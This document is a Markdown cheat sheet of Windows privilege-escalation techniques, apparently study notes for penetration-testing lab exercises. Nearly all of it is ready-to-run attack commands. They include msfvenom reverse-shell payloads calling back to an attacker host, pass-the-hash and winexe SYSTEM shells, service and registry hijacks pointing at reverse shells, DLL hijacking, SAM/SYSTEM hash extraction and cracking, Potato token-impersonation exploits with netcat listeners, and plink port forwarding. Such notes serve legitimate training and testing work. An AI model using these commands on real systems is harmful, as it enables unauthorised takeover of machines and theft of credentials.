# Windows Privilege Escalation  

  1. Begin by checking your user and your groups
  `whoami`
  `net user <username>`
  2. run winPEAS with searchfast and cmd
   `searchfast        Avoid sleeping while searching files (notable amount of resources)`
   `cmd               Obtain wifi, cred manager and clipboard information executing CMD commands`
  3. Run seatbelt and other scripts in windows privesc directory
  4. If scripts fail due to antivirus or other unknown reasons, execute the commands manually:
  [SwisskyRep CheatSheet](Other Cheatsheets: http://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
 ## Admin Shells
 1. Reverse shell with msfvenom (Note: will be blocked by antivirus)
 `msfvenom -p windows/x64/shell_reverse_ tcp LHOST=x.x.x.x LPORT=XXXX -f exe -o reverse.exe`
 Note: change exe to dll, or msi, and change the extension of output for other filetypes
 
 2. IF RDP is avaialble or can be enabled, we can add a low privileged user to the admin group and then spawn a shell (net localgroup administrators <username> /add) 
  
### Spawn System Shell with Password
winexe -U 'admin%password123' --system //192.168.40.229 cmd.exe

### Spawn System shell with Psexec
To escalate from admin user to full SYSTEM .\PsExec64.exe -accepteula -I -s C:\Location\reverseshell.exe

### Spawn System shell with pass the hash
pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.40.232 cmd.exe

## Tools
[winPEAS](https://github.com/carlospolop/priviledge-escalation-awesome-scripts-suite/tree/master/winPEAS)
winPEAS searches and highlights misconfigurations. To enable colors in a command prompt you must first run this command:
`reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`

Then you must close and reopen the command prompt. Then you can run winPEAS
Note: if you are running winPEAS from a shell on kali you will not need to run this.

[PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)
* Needs to be run from powershell
* Searches for specific privilege escalation misconfigurations

To run:
1. powershell -exec bypass
2. . .\PowerUp.ps1 
(Alternatively you can run Import-Module PowerUp.ps1
3. Invoke-AllChecks

[SharpUp](https://github.com/GhostPack/SharpUp)
[PreCompiled](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe)
* Searches for specific privilege escalation misconfigurations
* Can be run from powershell or command prompt

[Seatbelt](https://github.com/GhostPack/Seatbelt)
[Pre-Compiled](https://github.com/r3motecontrol/Ghostpack/CompiledBinaries/blob/master/Seatbelt.exe)
* Seatbelt performs numerous types of enumeration. It will not print out misconfigurations but can be used to collect data for discovering misconfigurations

[accesschk.exe](https://github.com/Andross/oscp/raw/main/accesschk.exe)
I have taken the liberty of uploading the older accesschck file that doesn't popup a GUI (the one from Tib3rius's course). It is linked above
* Checks user access control rights. This tools can be used to check wheter a user or group has access to files, directorys, services, and registry keys.
* You can supply the tool with different usernames to check for:
`.\accesscheck /accepteula -uvqc username servicename`

**check service permissions (Which users can access and with what level of permissions)**
`.\accesscheck /accepteula -quvw "C:\This\Is\The\Path"`

**check for start stop permission**
`.\accesscheck /accepteula -uvqc servicename`

**Find all weak folder permissions per drive.**
`accesschk.exe -uwdqs Users c:`
`accesschk.exe -uwdqs "Authenticated Users" c:\`

**Find all weak file permissions per drive.**
``accesschk.exe -uwqs Users c:.``
``accesschk.exe -uwqs "Authenticated Users" c:.``
 
## Kernel Exploits
Finding Kernel Exploits
  1. Enumerate Windows version / Patch level
  `systeminfo`
  2. Search for exploits (ExploitDB, Google, GitHub(
  3. Compile the exploit on the target machine and then run it. Not recommended to compile on your attacker machine as the architecture could differ.
  4. It is possible to crash the system with Kernel exploits, be careful when running these exploits
  
### Tools
[Windows Exploit Suggester](https://github.com/bitsadmin/wesng)
* Run windows exploit suggester by using the command below:
`python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more`
* Then cross reference the results with the pre-compiled kernel exploits on the [SecWiki](https://github.com/SecWiki/windows-kernel-exploits)
* Transfer the binary to the machine
* Start your nc listener
* Run exploit by following instructions or reading the code to see what is required

[Watson](https://github.com/rasta-mouse/Watson) 
* Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.

## Service Exploits
* Query the configuration of a service:
`sc.exe qc <ServiceName>`
* Query the current status of a service:
`sc.exe query <ServiceName>`
* Modify a configuration option of a service: 
`sc.exe config <ServiceName> <option>= <value>`
* Start/Stop a service: 
`net start/stop <ServiceName>`

### Service Misconfiguration Types

### Insecure Service Properties
Note: If you cannot start and stop a service you will not be able to exploit this. You can check this by running the below accesschk
`.\accesscheck /accepteula -uvqc servicename`
1. Run winPEAS to enumerate service information:
`.\winPEASany.exe quiet servicesinfo`
2. From your shell confirm your access permissions to the service
`.\accesschck.exe /accepteula -uqvwc <username> <servicename>`
3. Query the service configuration
`sc qc <servicename>`
4. Query current state of the service
`sc query <servicename>`
5. If you can, set the service binary to the location of your reverse shell
`sc config <servicename> binpath= "\"C:\reverse.exe""`
6. Start your nc listener
7. Start/restart the service

### Unquoted Paths
* Exectuables in windows can be run without the extension (e.g. whoami.exe > whoami)
* Windows treats everything after a space as arguments for the program (e.g. program.exe arg1 arg2)
* This leads to ambiguity when using absolute path that contain spaces and are not surrounded by quotes
* If we can write to a location that Windows checks before the actual exectuable, we can trick the service into executing our exectuable instead

1. Enumerate services using winpeas
`.\winPEASany.exe quiet servicesinfo`
2. You can also find unquoted paths using wmic
`wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`
3. If either command returns a path to an executable that does not contain quotes AND you can write to one of the folder before the exectuable, you have an unquoted service vulnerability.
4. Check that you can start and stop that service
`.\accesscheck /accepteula -uvqc <username> <servicename>`
5. Check for write permissions in the existing binary paths to the service
`.\accesschck.exe /accepteula -uwdq "C:\"`
`.\accesschck.exe /accepteula -uwdq "C:\Program Files\"`
`.\accesschck.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`
6. If you can, create a reverse shell in the path with the name of the folder that would be passed as an argument. For example, if the command is `"C:\Program Files\Unquoted Path Service\" "Common"` where `Common` is passed as an argument in this case to a program called `C:\Program Files\Unquoted Path Service.exe`, we can create a file called `Common.exe` to be executed when the service starts.
7. Start a nc listener
8. Start the service

### Weak Registry Permissions
* The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service's configuration even if we cannot modify the service directly. 
1. Enumerate with winPEAS
2. Verify registry permission with powershell
`Get-ACL HKLM:\System\CurrentControlSet\Service\regsvc | Format-List`
* or verify with accesscheck
`.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`
3. Use accesschk.exe to verify if you can start and stop the  service.
`.\accesschk.exe /accepteula -ucqv user regsvc`
4. Check the current values in the service registry
`reg query HKLM\System\CurrentControlSet\Services\regsvc`
5. If you have permission, overwrite the image path value in the services registry entry so that it points to our reverse shell (same as changing the bin path of our service)
`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\path\to\revshell.exe /f`
6. Start a listener
7. Start the service

### Insecure Service Executables
* If the original service exectuable is modifyable by our user we can simply replace it with our reverse shell
* Make sure to create a backup of the original executable
1. Use winPEAS to search for insecure service executables
`.\winPEASany.exe quiet servicesinfo`
2. Confirm with accesschk.exe
`.\accesschk.exe /accepteula -uwq "C:\Program Files\File Permissions Service\filepermservice.exe"`
3. Confirm we can stop and start the service
`.\accesschk.exe /accepteula -ucqv user filepermsvc`
4. Backup original service exectuable
`copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp`
5. Overwrite the original service
`copy /Y C:\path\to\reverseshell.exe "C:\Program Files\File Permissions Service\filepermservice.exe"`
6. Start nc listener
7. Start the service

### DLL Hijacking
* Often a service will try to load functionality from a library called a DLL (dynamic link library). Whatever functionality the DLL provides, will be executed with the same privileges as the service that loaded it. 
* If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.
* A more common misconfiguration that can be used for privesc is fi a DLL is missing from the system, and our user has write access to a directory within the PATH that Windows searches for DLL
* However, detection of vulnerable services is difficult and is a manual process
1. Enumerate the winPEAS output for DLL hijacking (C:\Temp is writable and in the PATH) and non-windows services 
2. Enumerate which of the services for which we have start/stop ability (Only doing DLL in the e.g.)
`.\accesschk.exe /accepteula -ucqv user dllsvc`
3. Confirm the service 
`sc qc dllsvc`
4. Copy service to a vm with admin rights to analyze the file
* Use Procmon to analyze and confirm that the service is in the C:\Temp PATH
5. Generate a reverse shell with format set to DLL
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=X.X.X.X LPORT=XXXX -f dll -o reverse.dll`
6. Copy the dll into the folder you have permissions to write in on the PATH
`copy \\192.168.x.x\revesrse.dll C:\Temp`
7. Stop then start the service
`net stop dllsvc
net start dllsvc`

## Passwords
* Several features of windows store passwords insecurely

### Registry

* Search the registry for passwords with commands:
`reg query HKLM /f password /t REG_SZ /s
reg query HKCM /f password /t REG_SZ /s`
* These will have LOTS of results

#### winPEAS
1. Run winPEAS for files/user info
`.\winPEASany.exe quiet filesinfo userinfo`
2. Use winexe to spawn a shell
`winexe -U 'admin%password123' //192.168.X.X cmd.exe`
3. Since the user we have spawned a shell as is an admin we can modify the command and get a system shell
`winexe -U 'admin%password123' --system //192.168.X.X cmd.exe`

### Saved Creds
* Windows has a runas command which allows users to run commands with the privileges of other users.
* This usually requires the knowledge of the other users password
* However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement

#### winPEAS
1. Run with creds checks
`.\winPEASany.exe quiet cmd windowscreds`
2. Confirm manually by running:
`cmdkey /list`
3. Start a listener on kali
4. Use runas to execute a reverseshell as credentialed user
`runas /savecred /user:admin C:\path\to\reverseshell.exe`

### Configuration Files
* Some admins will leave config files on the system with passwords in them
* The "Unattend.xml" file is an example of this.

Commands to help search for passwords in config files (in may be easier to search manually)
`dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt`
* Note these commands only search in the current directory

#### winPEAS
1. Run winPEAS to search for creds in files
`.\winPEASany.exe quiet cmd searchfast filesinfo`
2. Print contents of found files to search them
`type C:\Windows\Panther\Unattend.`
3. In this example the password is base64 encoded. We can decode using kali
`echo 'base64encodedvalue' | base64 -d`
4. Then use winexe to login with the password
`winexe -U 'admin%password123' --system //192.168.X.X cmd.exe`

### SAM (Security Account Manager)
* Windows stores password hashes in the Security Account Manager (SAM)
* The hashes are encrypted with a key which can be found in a file named SYSTEM
* If you can read the SAM and the SYSTEM file you can extract the hashes.
* The SAM and SYSTEM files are located in the C:\Windows\System32\config directory.
* The files are locked while Windows is running.
* Backups may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories.

#### winPEAS
1. Run winPEAS to search for creds in files
`.\winPEASany.exe quiet cmd searchfast filesinfo`
2. Copy SAM and SYSTEM backup files to kali
`copy C:\Windows\Repair\SAM \\192.168.X.X\files
copy C:\Windows\Repair\SYSTEM \\192.168.X.X\files`
3. You can use SAM dump or PwDump to dump files.
4. The current pwdump available on Kali is out of date so we will need to grab the newest version
`git clone https://github.com/CiscoCXSecurity/creddump7.git`
* Must be run with python 2 (kalis default python)
5. Run creddump
` python2 pwdump.py SYSTEM SAM`
6. Crack hash with hashcat (or john)
`hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`

## Scheduled Tasks
* Administrators can create tasks that are run as other users including SYSTEM
* Unfortunately, as a low privileged user there is no easy method to enumerate tasks for other users
* You can however use some commands to list all the tasks your user can see:
`schtasks /query /fo LIST /v`
Or Powershell:
`Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State`
* Often we have to rely on other clues, such as finding a script or log file indicating a task is being run.

## Insecure GUI Apps
* On some older version of windows, users can be granted the ability to run specific apps with admin privileges
* Often numerous ways to run windows applications using built-in functionality (often called escapes, i.e. Citirix escapes)
`tasklist /V | findstr mspaint.exe`

## Startup Apps
* Each user can define apps that start when they login by placing shortcuts to them in a specific directory
* Windows has a startup directory for applications that should start for all users
`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
* If we can create files in this directory we can spawn a reverse shell when an admin logs in
* We can use accesscheck to check our permissions on this directory
`.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
* Files in this directory *must* be shortcuts. You can use the CreateShortcut.vbs script to make a shortcut in this directory. May need modification.

## Installed Apps
* On [exploit-db](https://www.exploit-db.com/) we can select [Type: Local, Platform: Windows](https://www.exploit-db.com/?type=local&platform=windows). Then click the *Has App* checkbox, and in the search box put priv esc.
* We can manually enumerate all running programs using tasklist
`tasklist /V`
* We can also use Seatbelt.exe to search for nonstandard processes
`.\Seatbelt.exe NonstandardProcesses`
* We can also use winPEAS using the procesinfo option (note the misspelled proces)
`.\winPEASany.exe quiet procesinfo`
* Once you find an interesting process, use exploit-db (or google, or github) to find relevant exploits

## Token Impersonation
* Service accounts are usually local accounts on a specific system and are used to run a specific service. These accounts cannot be logged into directly.
* Multiple problems have been found with service accounts, making them suitable for privilege escalation.

### RottenPotato
* Service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user.
* This was possible because service accounts often have the *SeImpersonatePrivilege" privilege enabled.
* Any user with *SeImperonatePrivilege* privilege can run the exploits below.

### JuicyPotato
* RottenPotato was quite limited exploit.
* JuicyPotato works in the same way as RottenPotato but the authors found many more ways to exploit it. [JuicyPotato GitHub](https://github.com/ohpe/juicy-potato)
* How to get a shell with a service account? 
  * For example if IIS runs with a service account and you can upload an asp shell you would have a reverse shell with that service account
  * Or if you have SQL injection on MSSQL with xp_cmdshell enabled you can get a shell that way with the MSSQL service account
* JuicyPotato is fixed on the most recent version of Windows 10

#### PsExec
1. You can run PsExec with the privileges of a service account to launch an executable of your choice such as a reverse shell. In the example below we will use the local service account which is a built-in service account in windows.
`.\PsExec64.exe -accepteula -i -u "nt authority\local service" reverse.exe`
2. Once we have a reverse shell we can check our privileges
`whoami /priv`
3. If you have the *SeImpersonatePrivilege* privilege you can run JuicyPotato
`.\JuicyPotato.exe -l 1337 -p C:\path\to\reverseshell.exe -t * -c {CLSID}`
Note: The -l must use an available local port, the -c must use a valid CLSID for the version of windows you are on. These CLSID's are available on the JuicyPotato GitHub, as well as a powershell script that can be used to enumerate valid CLSID's

### RoguePotato
* Latest of the "Potato" exploits
[GitHub](https://github.com/antonioCoco/RoguePotato)
[Blog](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
[Compiled Exploit](https://github.com/antonioCoco/RoguePotato/releases/tag/1.0)

1. In the example, you will need 3 Kali terminal windows.
2. In the first one you will need to run a socat redirector back to the windows box
`sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.X.X:9999`
3. Then setup nc listener to catch shell from service account running with the *SeImpersonatePrivilege* privilege
`sudo nc -nlvp 53`
4. Over on the windows, start an elevated command prompt using the admin windows credentials
Note: this is only done to simulate getting a shell. In a real engagement you would get a shell a different way then discover the user has the *SeImpersonatePrivilege* or *SeAssignPrimaryToken* privileges.
5. We will use PsExec to run our reverse shell as the local service account
`.\PsExec64.exe -accepteula -i -u "nt authority\local service" reverse.exe`
6. In the third window will run nc to catch the system level shell
`sudo nc -nlvp 53`
7. In the local service shell we will run RoguePotato
`.\RoguePotato.exe -r 192.168.X.X -l 9999 -e C:\path\to\reverseshell.exe`
Note: -r is kali ip address as its redirector and to listen on port 9999. This is for the socat redirector we set up earlier

### PrintSpoofer

* PrintSpoofer is another exploit that is currently unpatched that targets the print spooler service
[GitHub](https://github.com/itm4n/PrintSpoofer)
[Blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
* Doesn't require any port forwarding
1. Once again we need to catch a shell (simulate) for a service account with *SeImpersonatePrivilege* or *SeAssignPrimaryToken* privileges. In one window start a nc listener
2. Once again start an elevated command prompt to simulate spawning a shell with a service account.
3. PrintSpoofer.exe requires the Visual C++ redistributable is installed
4. You will need to transfer and run vc_redist.x64.exe 
5. Once you get a shell with a service account with the above privileges. You will run PrintSpoofer from this service shell:
`.\PrintSpoofer.exe -i -c C:\path\to\revereshell.exe`

## Port Forwarding

* Sometimes it is easier to ru nexploit code on Kali, but the vulnerable program is listening on an internal port.
* In this case we need to forward a port on Kali to the internal port on windows
* We can do this using a program called plink.exe (from the makers of putty)
1. If the firewall is blocking port 445 which the winexe command uses to connect we may need to use port forwarding
2. We must permit root login to ssh on our kali box (if we are using a root user on kali). We can do this by making sure that the /etc/ssh/sshd_config file has the `PermitRootLogin yes` uncommented.
3. If it isn't uncommented you will have to restart ssh `service ssh restart`
4. Next we run plink.exe `.\plink.exe root@192.168.X.X -R 445:127.0.0.1:445`
Note: root@192.168.x.x is the user and ip of the kali box, 445 is the port to forward on kali, while 127.0.0.1:445 is the local ip of the windows box and the port to forward locally.
5. Now we can modify the winexe on our kali box to point to local host `winexe -U admin%password123 //127.0.0.1 cmd.exe`

## Privilege Escalation Strategy
* Enumeration is key
1. Check your user (whoami and whoami /priv) and groups (net user <username>)
2. Run winPEAS with fast, searchfast and cmd options
* If your initial scans don't find anything you can run it without these commands
4. Run seatbelt and other scripts as well!
5. If your scripts are failing and you don't know why you can always run the commands manually from the course and other Winodws PrivEsc cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

* Spend some time and read over the results of you enumeration
* If winPEAS or another tool finds something interesting make note of it
* Avoid rabbits holes by creating a checklist of things you need for the privilege escalation method to work

* Have a quick look around for files in your users desktop and other common locations (e.g C:\ and C:\Program Filess)
* Read through interesting files that you find , as they may contain useful information that could help escalate privileges.
* Try things that don't have many steps first (e.g registry exploits, services, etc)

* Have a good look at admin processes, enumerate their versions and search for exploits
* Check for internal ports that you might be able to forward to your attacking machine

* If you still don't have an admin shell, re-read your full enumeration dumps and highlight anything that seems odd
* THis might be a process or file name you aren't familiar with or even a username.
* At this stage you may also start to consider Kernel Exploits

## getsystem (Named Piupes and Token Duplication)

### Access Tokens

* Access Tokens are special objects in Windows which store a user's identity and privileges.
* Primary Access Token - Created when the user logs in, bound to the current user session. When a user starts a new process, their primary access toekn is copied and attached to the new process.
* Impersonation Access Token - Created when a process or thread needs to temporarily run with the security context of another user.

### Token Duplication

* Windows allows processes/threads to duplicate their access tokens.
* An impersonation access token can be duplicated into a primary access token this way.
* If we can inject into a process, we can use this functionality to duplicate the access token of the process, and spawn a separate process with the same privileges.

### Named Pipes
* May already be familiar with the concept of a *pipe* in Windows & Linux: `systeminfo | findstr Windows
* A named pipe is an extension of this concept
* A prcoess can create a named pipe, and other processes can open the named pipe to read or write data from/to it
* The process whcih created the named pipe can impersonate the security context of a process whcih connects to the named pipe

### getsystem
* The *getsystem* command in Metasploits Meterpreter can excalate our privilegs to that of the SYSTEM user
* The source code for the getsystem can found [here](https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter/source/extensions/priv)
* Three files worth looking at at: elevate.c, namedpipe.c, and tokendup.c
* These are 3 techniques getsystem can use to *get system*

#### Named Pipe Impersonation (In Memory/Admin)
* Creates a named pipe controlled by Meterpreter
* Creates a service (running as SYSTEM) which runs a command that interacts directly with the named pipe
* Meterpreter then impersonates the connected process to get an impersonation access token (with the SYSTEM security context)
* The access token is then assigned to all subsequent Meterpreter threads, meaning they run with SYSTEM privileges

#### Named Pipe Impersonation (Dropper/Admin)
* Very similar to Named Pipe Impersonation (In Memory/ADmin_
* Only difference is a DLL is written to disk, and a service created which runs the DLL as SYSTEM
* The DLL connects to the named pipe

#### Token Duplication (In Memory/Admin)
* This technique requires the *SeDebugPrivilege*
* Find a service running as SYSTEM which it injects a DLL into
* The DLL duplicates the access toekn of the service and assigns it to Meterpreter
* Currently this only works on x86 architectures
* This is the onl technique that does not have to create a service, and operates entirely in memory.

## User Privileges
* In Windows, user accounts and groups can be assigned specific *privileges*
* These privileges grant access to certain abilities
* Some of these abilities can be used to escalate your overall privielges to the of SYSTEM.
* Highly detailed paper: https://github.com/hatRiot/token-priv

### Listing our Privileges
`whoami /priv`
Note:: *disabled* in the state column is irrelevant here. If the privilege is listed your user has it.

### SeImpersonate Privilege
* Grant ability to impersonate any access token which it can obtain
* If an access token from a SYSTEM process can be obtained than a new process can be spawned using that token.
* The JuicyPotato exploit in a previous section abuses this ability

### SeAssignPrimaryPrivilege
* The SeAssignPrimaryPrivilege is similar to SeImpersonatePrivilege
* It enables a user to asisng an access token to a new process
* Again, this can be exploited with the JuicyPotato Exploit

### SeBackUpPrivilege
* Grants read access to all objects on the system, regardless of their ACL
* Useing this privilege a user could gain access to sensitive files, or extract hashes from the registry which could then be cracked or used ina pass-the-hask attack

### SeRestorePrivilege
* Grants write acces to all objects on the system, regardless of their ACL
* Many ways to abuse this:
  * Modify service binaries.
  * Overwrite DLLs userd by the SYSTEM processes
  * Modify registry settings

### SeTakeOwnershipPrivilege
* Lets user take ownership over an object (the WRITE_OWNER permission)
* Once you own an object, you can modify its ACL and grant yourself write access
* Same methods used with SeRestorePrivilege then Apply

### Other Privileges (More advanced)
* SeTcbPrivilege
* SeCreateTokenPrivilege
* SeLoadDriverPrivilege
* SeDebugPrivilege (used by get system)
